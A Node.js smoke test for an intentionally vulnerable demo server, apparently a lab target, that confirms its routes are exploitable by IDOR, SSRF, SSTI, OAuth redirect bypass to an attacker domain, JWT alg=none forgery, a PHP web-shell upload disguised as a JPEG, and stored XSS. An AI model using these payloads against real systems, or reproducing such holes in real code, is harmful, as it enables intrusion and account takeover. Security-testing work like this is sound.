// demo-target/test-smoke.js
// Smoke test: hit every vulnerable route, verify expected behavior.

const { spawn } = require('child_process');
const path = require('path');

const PORT = 4567;
const BASE = `http://127.0.0.1:${PORT}`;

async function startServer() {
  return new Promise((resolve, reject) => {
    const p = spawn(process.execPath, [path.join(__dirname, 'server.js')], {
      stdio: ['ignore', 'pipe', 'pipe'],
      env: { ...process.env },
    });
    let started = false;
    p.stdout.on('data', d => {
      const s = d.toString();
      if (s.includes('listening')) { started = true; resolve(p); }
    });
    p.stderr.on('data', d => process.stderr.write(`[demo-target] ${d}`));
    p.on('exit', code => { if (!started) reject(new Error(`exited ${code}`)); });
    setTimeout(() => { if (!started) reject(new Error('startup timeout')); }, 3000);
  });
}

async function get(url, headers = {}) {
  const r = await fetch(url, { headers });
  return { status: r.status, body: await r.text(), headers: r.headers };
}
async function post(url, body, headers = {}) {
  const allHeaders = { 'content-type': 'application/json', ...headers };
  const r = await fetch(url, {
    method: 'POST',
    headers: allHeaders,
    body: typeof body === 'string' ? body : JSON.stringify(body),
  });
  return { status: r.status, body: await r.text(), headers: r.headers };
}

let pass = 0, fail = 0;
function check(label, cond) {
  if (cond) { console.log(`  ok   ${label}`); pass++; }
  else      { console.log(`  FAIL ${label}`); fail++; }
}

(async () => {
  const server = await startServer();
  console.log('[smoke] demo-target up');

  try {
    // 1. landing page
    {
      const r = await get(BASE + '/');
      check('GET / returns HTML', r.status === 200 && r.body.includes('Ultimatrix Demo Target'));
    }

    // 2. login
    let token;
    {
      const r = await post(BASE + '/login', { username: 'alice', password: 'password123' });
      const j = JSON.parse(r.body);
      check('POST /login alice OK', r.status === 200 && !!j.token);
      token = j.token;
    }

    // 3. IDOR — unauth can see user 3 (admin)
    {
      const r = await get(BASE + '/api/users/3');
      const j = JSON.parse(r.body);
      check('IDOR /api/users/3 unauth -> admin', r.status === 200 && j.username === 'admin');
    }

    // 4. SSRF guard against http:// protocol (allowed) — return external data
    {
      const r = await get(BASE + '/api/preview?url=http://127.0.0.1:' + PORT + '/health');
      const j = JSON.parse(r.body);
      check('SSRF /api/preview fetches local URL', r.status === 200 && j.body && j.body.includes('"ok":true'));
    }

    // 5. SSTI
    {
      const r = await get(BASE + '/api/render?template=' + encodeURIComponent('<%= 7*7 %>'));
      check('SSTI /api/render evaluates JS', r.status === 200 && r.body.includes('49'));
    }

    // 6. GraphQL introspection
    {
      const r = await post(BASE + '/graphql', { query: '{ __schema { types { name } } }' });
      const j = JSON.parse(r.body);
      check('GraphQL introspection exposed', r.status === 200 && j.data.__schema.types.some(t => t.name === 'User'));
    }

    // 7. OAuth redirect_uri prefix-bypass
    {
      const url = BASE + '/oauth/authorize?client_id=demo-app&response_type=code&redirect_uri=' +
        encodeURIComponent('https://demo-app.test/.attacker.com/callback') + '&state=abc';
      const r = await fetch(url, { redirect: 'manual' });
      const loc = r.headers.get('location') || '';
      check('OAuth redirect_uri prefix-bypass accepted', r.status === 302 && loc.includes('.attacker.com') && loc.includes('code=') && loc.includes('state=abc'));
    }

    // 8. OIDC discovery
    {
      const r = await get(BASE + '/.well-known/openid-configuration');
      const j = JSON.parse(r.body);
      check('OIDC discovery has authorize + token endpoint', r.status === 200 && j.authorization_endpoint.includes('/oauth/authorize') && j.token_endpoint.includes('/oauth/token'));
    }

    // 9. admin dashboard — regular user 403, admin 200
    {
      const r1 = await get(BASE + '/admin/dashboard');
      check('admin dashboard unauth -> 401', r1.status === 401);

      const r2 = await get(BASE + '/admin/dashboard', { authorization: 'Bearer ' + token });
      check('admin dashboard alice -> 403', r2.status === 403);

      const adminLogin = await post(BASE + '/login', { username: 'admin', password: 'admin123' });
      const adminToken = JSON.parse(adminLogin.body).token;
      const r3 = await get(BASE + '/admin/dashboard', { authorization: 'Bearer ' + adminToken });
      check('admin dashboard admin -> 200', r3.status === 200 && r3.body.includes('launch codes'));
    }

    // 10. JWT alg=none forgery
    {
      const { verifyJwt } = require('./server.js');
      const h = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
      const p = Buffer.from(JSON.stringify({ sub: 3, role: 'admin' })).toString('base64url');
      const forged = `${h}.${p}.`;  // empty signature
      const claims = verifyJwt(forged);
      check('JWT alg=none forgery accepted', claims && claims.role === 'admin' && claims.sub === 3);
    }

    // 11. file upload Content-Type bypass — upload a "PHP shell" with a safe content-type
    {
      const body = '<?php system($_GET["c"]); ?>';
      const r = await fetch(BASE + '/api/upload', {
        method: 'POST',
        headers: { 'content-type': 'image/jpeg', 'x-filename': 'shell.php.jpg' },
        body,
      });
      const j = await r.json();
      check('file upload accepts php disguised as jpeg', r.status === 200 && j.stored === 'shell.php.jpg');
    }

    // 12. messages POST + GET XSS
    {
      const r1 = await post(BASE + '/api/messages', { body: '<script>alert(1)</script>' }, { authorization: 'Bearer ' + token });
      check('POST /api/messages stores XSS', r1.status === 200);

      const r2 = await get(BASE + '/api/messages');
      check('GET /api/messages reflects XSS unsanitized', r2.body.includes('<script>alert(1)</script>'));
    }
  } catch (e) {
    console.error('[smoke] error:', e);
    fail++;
  } finally {
    server.kill();
    console.log(`[smoke] pass=${pass} fail=${fail}`);
    process.exit(fail > 0 ? 1 : 0);
  }
})();
